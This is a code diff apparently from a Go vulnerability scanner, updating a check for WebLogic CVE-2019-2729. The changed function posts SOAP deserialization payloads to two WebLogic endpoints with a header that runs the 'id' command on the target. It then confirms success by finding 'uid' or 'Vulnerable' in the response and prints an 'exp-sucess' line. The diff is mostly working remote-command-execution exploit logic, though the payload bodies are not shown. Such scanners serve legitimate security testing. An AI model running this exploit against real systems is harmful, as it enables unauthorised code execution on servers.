@@ -2,7 +2,8 @@ package weblogic
 
 import (
 	"fmt"
-	"github.com/veo/vscan/poc"
+	"github.com/veo/vscan/pkg"
+	"strings"
 )
 
 func CVE_2019_2729(url string) bool {
@@ -3524,10 +3525,14 @@ func CVE_2019_2729(url string) bool {
 	   </soapenv:Body>
 	</soapenv:Envelope>
 	`
-	if req, err := cverequest(url+"/wls-wsat/CoordinatorPortType", "POST", payload1); err == nil {
-		if req2, err2 := cverequest(url+"/_async/AsyncResponseService", "POST", payload2); err2 == nil {
-			req3, _ := poc.HttpRequset(url+"/_async/favicon.ico", "GET", "")
-			if req.StatusCode == 200 || (req2.StatusCode == 202 && req3.StatusCode == 200) {
+	header := make(map[string]string)
+	header["Content-Type"] = "text/xml"
+	header["cmd"] = "id"
+	header["SOAPAction"] = ""
+	if req1, err := pkg.HttpRequset(url+"/wls-wsat/CoordinatorPortType", "POST", payload1, false, header); err == nil {
+		if req2, err2 := pkg.HttpRequset(url+"/_async/AsyncResponseService", "POST", payload2, false, header); err2 == nil {
+			req3, _ := pkg.HttpRequset(url+"/_async/favicon.ico", "GET", "", false, nil)
+			if (req1.StatusCode == 200 && strings.Contains(req1.Body, "uid")) || (req2.StatusCode == 202 && strings.Contains(req3.Body, "Vulnerable")) {
 				fmt.Printf("weblogic-exp-sucess|CVE_2019_2729|%s\n", url)
 				return true
 			}
